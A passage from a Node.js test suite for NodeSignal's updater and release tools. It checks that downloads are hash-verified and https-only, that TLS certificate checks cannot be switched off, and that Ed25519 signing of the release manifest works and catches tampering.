        ['too big for the transport', (u, o) => U.httpsGetStream(L('/big-length'), { ...o, ...T }), /larger than/],
      ];
      for (const [what, getStream, re] of cases) {
        await assert.rejects(U.downloadVerified({ url, sha256: sha(ASSET), size: ASSET.length, dest, getStream }), re, what);
        assert.deepStrictEqual(files(d), [], what + ': no file and no .part left');
      }
      await assert.rejects(U.downloadVerified({ url, sha256: sha(ASSET), size: ASSET.length, dest, get: async () => ({ status: 200, body: bad }) }), /SHA-256/);
      assert.deepStrictEqual(files(d), []);
      // the default transport keeps the https rules
      await assert.rejects(U.downloadVerified({ url: L('/asset'), sha256: sha(ASSET), size: ASSET.length, dest }), /only https/);
      assert.deepStrictEqual(files(d), []);
      await assert.rejects(U.downloadVerified({ url, sha256: 'abc', size: 5, dest }), TypeError);
      await assert.rejects(U.downloadVerified({ url, sha256: sha(ASSET), size: 300 * 1024 * 1024, dest }), TypeError);
    });
  } finally {
    server.closeAllConnections();
    server.close();
  }

  /* ------------------------------------------------------------ TLS via connect() */
  await t('httpsGet: connect() carries the request, wrapped in TLS for the real host name', async () => {
    const raw = net.createServer((s) => { s.on('error', () => {}); s.end('HTTP/1.1 200 OK\r\n\r\nplain text, not TLS'); });
    await listen(raw, RAW_PORT);
    const calls = [];
    const connect = (host, port) => { calls.push([host, port]); return new Promise((res, rej) => { const s = net.connect(RAW_PORT, '127.0.0.1', () => res(s)); s.on('error', rej); }); };
    try {
      await assert.rejects(U.httpsGet(`${API}`, { connect, timeoutMs: 5000 }), (e) => !/must not|only https|host not allowed/.test(e.message));
      assert.deepStrictEqual(calls, [['api.github.com', 443]], 'the host name goes to connect(); no DNS lookup here');
    } finally { raw.close(); }
  });

  const kf = path.join(TMP, 'tls-key.pem'), cf = path.join(TMP, 'tls-cert.pem');
  const ossl = spawnSync('openssl', ['req', '-x509', '-newkey', 'ec', '-pkeyopt', 'ec_paramgen_curve:prime256v1', '-nodes',
    '-keyout', kf, '-out', cf, '-days', '1', '-subj', '/CN=api.github.com', '-addext', 'subjectAltName=DNS:api.github.com'], { encoding: 'utf8' });
  if (ossl.error || ossl.status !== 0) {
    skip('httpsGet: certificate verification stays on', 'needs the openssl command to make a throwaway certificate');
  } else {
    await t('httpsGet: certificate verification stays on, even with NODE_TLS_REJECT_UNAUTHORIZED=0', async () => {
      const srv = tls.createServer({ key: fs.readFileSync(kf), cert: fs.readFileSync(cf) }, (s) => { s.on('error', () => {}); s.end('HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok'); });
      srv.on('tlsClientError', () => {});
      await listen(srv, TLS_PORT);
      const connect = () => new Promise((res, rej) => { const s = net.connect(TLS_PORT, '127.0.0.1', () => res(s)); s.on('error', rej); });
      const before = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
      const noisy = process.emitWarning; process.emitWarning = () => {};   // Node warns about the variable itself
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
      try {
        // the server works for a client that skips verification...
        await new Promise((resolve, reject) => {
          const s = tls.connect({ host: '127.0.0.1', port: TLS_PORT, servername: 'api.github.com', rejectUnauthorized: false }, () => { s.destroy(); resolve(); });
          s.on('error', reject);
        });
        // ...and the updater still refuses its self-signed api.github.com
        await assert.rejects(U.httpsGet(API, { connect, timeoutMs: 5000 }), /self.signed|certificate/i);
      } finally {
        if (before === undefined) delete process.env.NODE_TLS_REJECT_UNAUTHORIZED; else process.env.NODE_TLS_REJECT_UNAUTHORIZED = before;
        process.emitWarning = noisy;
        srv.close();
      }
    });
  }

  /* ------------------------------------------------------------ the tools */
  await t('tools: release-key new + pub, release-manifest make + sign + verify round trip', () => {
    const w = fs.mkdtempSync(path.join(TMP, 'tools-'));
    const KEYTOOL = path.join(ROOT, 'tools', 'release-key.js'), MAN = path.join(ROOT, 'tools', 'release-manifest.js');
    const run = (args, env = {}) => spawnSync(process.execPath, args, { cwd: w, encoding: 'utf8',
      env: { ...process.env, NODESIGNAL_RELEASE_SIGNING_KEY: '', GITHUB_ACTIONS: '', ...env } });
    const keyFile = path.join(w, 'release-key.pem');

    let r = run([KEYTOOL, 'new', keyFile]);
    assert.strictEqual(r.status, 0, r.stderr);
    const pem = fs.readFileSync(keyFile, 'utf8');
    assert.match(pem, /^-----BEGIN PRIVATE KEY-----\n/);
    assert.strictEqual(crypto.createPrivateKey(pem).asymmetricKeyType, 'ed25519');
    if (process.platform !== 'win32') assert.strictEqual(fs.statSync(keyFile).mode & 0o777, 0o600, 'private key file is 0600');
    assert(!/PRIVATE KEY/.test(r.stdout + r.stderr) && !(r.stdout + r.stderr).includes(pem.split('\n')[1]), 'the private key is never printed');
    assert.match(r.stdout, /gh secret set NODESIGNAL_RELEASE_SIGNING_KEY < /);
    assert.match(r.stdout, /offline copy/);
    const m1 = /^\s*(\{"id":.*\})\s*$/m.exec(r.stdout);
    assert(m1, 'prints the release-keys.json entry');
    const entry = JSON.parse(m1[1]);
    assert.deepStrictEqual(Object.keys(entry), ['id', 'publicKey', 'added', 'note']);

    r = run([KEYTOOL, 'new', keyFile]);
    assert.notStrictEqual(r.status, 0, 'refuses to overwrite');
    assert.match(r.stderr, /already exists/);
    assert.strictEqual(fs.readFileSync(keyFile, 'utf8'), pem);

    r = run([KEYTOOL, 'pub', keyFile]);
    assert.strictEqual(r.status, 0, r.stderr);
    assert(!/PRIVATE KEY/.test(r.stdout));
    const again = JSON.parse(r.stdout.trim());
    assert.strictEqual(again.id, entry.id);
    assert.strictEqual(again.publicKey, entry.publicKey);
    const keysFile = path.join(w, 'release-keys.json');
    fs.writeFileSync(keysFile, JSON.stringify({ keys: [entry] }, null, 2) + '\n');
    assert.strictEqual(U.loadTrustedKeys(keysFile).length, 1, 'the printed entry is valid');

    // make
    const dist = path.join(w, 'dist'); fs.mkdirSync(dist);
    for (const [n, b] of Object.entries(FILES)) fs.writeFileSync(path.join(dist, n), b);
    const mfile = path.join(dist, MANIFEST);
    r = run([MAN, 'make', '1.4.0', dist]);
    assert.strictEqual(r.status, 0, r.stderr);
    const m = U.parseManifest(fs.readFileSync(mfile));
    assert.strictEqual(m.version, '1.4.0');
    assert.strictEqual(m.tag, 'v1.4.0');
    for (const [n, b] of Object.entries(FILES)) assert.deepStrictEqual(m.files[n], { sha256: sha(b), size: b.length }, n);
    const partial = path.join(w, 'partial'); fs.mkdirSync(partial);
    for (const n of Object.keys(FILES).slice(0, 2)) fs.writeFileSync(path.join(partial, n), FILES[n]);
    r = run([MAN, 'make', '1.4.0', partial]);
    assert.strictEqual(r.status, 1);
    assert.match(r.stderr, /missing.*nodesignal-linux-arm64\.deb/);
    assert(!fs.existsSync(path.join(partial, MANIFEST)));
    assert.strictEqual(run([MAN, 'make', 'latest', dist]).status, 1, 'not a version');

    // sign without the secret: a warning, exit 0, nothing written
    r = run([MAN, 'sign', mfile]);
    assert.strictEqual(r.status, 0, r.stderr);
    assert.match(r.stderr, /NOT signed/);
    assert(!fs.existsSync(mfile + '.sig'));
    r = run([MAN, 'verify', mfile, keysFile]);
    assert.strictEqual(r.status, 1);
    assert.match(r.stdout, /FAILED: .*no signature/);
    // the key is never taken from the command line
    r = run([MAN, 'sign', mfile, keyFile], { NODESIGNAL_RELEASE_SIGNING_KEY: pem });
    assert.strictEqual(r.status, 2);
    assert(!fs.existsSync(mfile + '.sig'));

    // sign with the key in the environment
    r = run([MAN, 'sign', mfile], { NODESIGNAL_RELEASE_SIGNING_KEY: pem });
    assert.strictEqual(r.status, 0, r.stderr);
    assert(fs.existsSync(mfile + '.sig'));
    assert(!/PRIVATE KEY/.test(r.stdout + r.stderr) && !(r.stdout + r.stderr).includes(pem.split('\n')[1]));
    assert.match(r.stdout, new RegExp(`with key ${entry.id}`));
    assert.match(r.stderr, /not in release-keys\.json/, 'warns when the repository does not list the key');
    const sigObj = JSON.parse(fs.readFileSync(mfile + '.sig', 'utf8'));
    assert.deepStrictEqual(Object.keys(sigObj), ['v', 'keyId', 'sig']);
    assert.strictEqual(sigObj.keyId, entry.id);

    // verify, and the updater agrees
    r = run([MAN, 'verify', mfile, keysFile]);
    assert.strictEqual(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /^OK: NodeSignal 1\.4\.0/m);
    assert.match(r.stdout, /ok\s+nodesignal-linux-amd64\.deb/);
    const v = U.verifyManifest({ manifestBytes: fs.readFileSync(mfile), sigBytes: fs.readFileSync(mfile + '.sig'), trustedKeys: U.loadTrustedKeys(keysFile) });
    assert.strictEqual(v.ok, true, v.error);

    // failures: another key, a changed installer, a changed manifest
    const otherKeys = path.join(w, 'other-keys.json');
    fs.writeFileSync(otherKeys, JSON.stringify({ keys: [OTHER.entry] }));
    r = run([MAN, 'verify', mfile, otherKeys]);
    assert.strictEqual(r.status, 1);
    assert.match(r.stdout, /does not trust/);
    fs.appendFileSync(path.join(dist, AMD), 'x');
    r = run([MAN, 'verify', mfile, keysFile]);
    assert.strictEqual(r.status, 1);
    assert.match(r.stdout, /BAD\s+nodesignal-linux-amd64\.deb/);
    fs.writeFileSync(path.join(dist, AMD), ASSET);
    const orig = fs.readFileSync(mfile);
    fs.writeFileSync(mfile, orig.toString().replace(/"1\.4\.0"/, '"1.4.1"').replace(/"v1\.4\.0"/, '"v1.4.1"'));
    r = run([MAN, 'verify', mfile, keysFile]);
    assert.strictEqual(r.status, 1);
    assert.match(r.stdout, /does not match/);
    fs.writeFileSync(mfile, orig);
    assert.strictEqual(run([MAN, 'verify', mfile, keysFile]).status, 0);

    // a secret pasted with escaped newlines still signs; a new make drops the old .sig
    r = run([MAN, 'sign', mfile], { NODESIGNAL_RELEASE_SIGNING_KEY: pem.replace(/\n/g, '\\n') });
    assert.strictEqual(r.status, 0, r.stderr);
    r = run([MAN, 'make', '1.4.0', dist]);
    assert.strictEqual(r.status, 0, r.stderr);
    assert(!fs.existsSync(mfile + '.sig'), 'a signature for the previous manifest is removed');
  });

  fs.rmSync(TMP, { recursive: true, force: true });
  console.log(failed ? `\n${failed} failed, ${passed} passed` : `\nall passed (${passed}${skipped ? `, ${skipped} skipped` : ''})`);
  process.exit(failed ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
